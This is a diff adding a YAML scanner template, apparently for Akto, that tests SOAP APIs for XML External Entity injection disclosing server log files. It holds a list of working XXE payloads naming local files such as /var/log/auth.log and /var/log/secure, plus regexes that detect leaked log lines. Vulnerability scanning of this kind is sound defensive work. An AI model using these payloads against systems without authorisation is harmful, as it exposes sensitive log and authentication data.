@@ -1,0 +1,131 @@
+id: XXE_SOAP_API_LOG_FILE_DISCLOSURE
+info:
+  name: "XML External Entity (XXE) test on SOAP API for Log File Disclosure"
+  description: >
+    "This test involves exploiting XML parsing vulnerabilities to extract and reveal sensitive log file contents, potentially exposing critical information about the SOAP API's activities and system logs."
+  details: >
+    "Conducting an XML External Entity (XXE) test on SOAP API for Log File Disclosure entails manipulating XML structures to unveil confidential log file contents, providing adversaries with insights into SOAP API activities and potential security implications."
+  impact: >
+    "Successful XML External Entity (XXE) test on SOAP API for Log File Disclosure can lead to unauthorized access to critical log file contents, exposing potential security vulnerabilities, and compromising the integrity of SOAP API activities with implications for system security."
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: XXE_SOAP_API_DB_CONFIG_DISCLOSURE
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    - "https://www.akto.io/blog/xml-external-entity-attack"
+    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
+  cwe:
+    - CWE-611
+    - CWE-827
+  cve:
+    - CVE-2022-42745
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    contains_either: "soap:Envelope"
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  request_headers:
+    for_one:
+      key:
+        contains_either:
+          - content-type
+          - Content-Type
+        extract: headerKey
+  method:
+    contains_either:
+      - POST
+      - PUT
+      - PATCH
+wordLists:
+  payloads:
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/syslog\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/messages\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/auth.log\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/secure\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/error.log\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/httpd/access_log\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/httpd/error_log\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/nginx/error.log\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/nginx/access.log\">]>"
+    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///var/log/mysql/error.log\">]>"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - replace_body:  ${payloads}
+        - modify_header:
+            ${headerKey}: "application/xml"
+validate:
+  response_payload:
+    regex: "\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}|[A-Z]+\\s+\\[\\w+\\].+\\d{4}/\\d{2}/\\d{2} \\d{2}:\\d{2}:\\d{2}\\.\\d{3}|(\\[.*\\] \\[.*\\] \\[client \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\])|\\b[A-Z]+\\b \\d{1,2} \\d{2}:\\d{2}:\\d{2} \\w+ \\w+\\[\\d+\\]:"
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - Attention Required!
+      - CloudFlare
+      - Sorry, you have been blocked
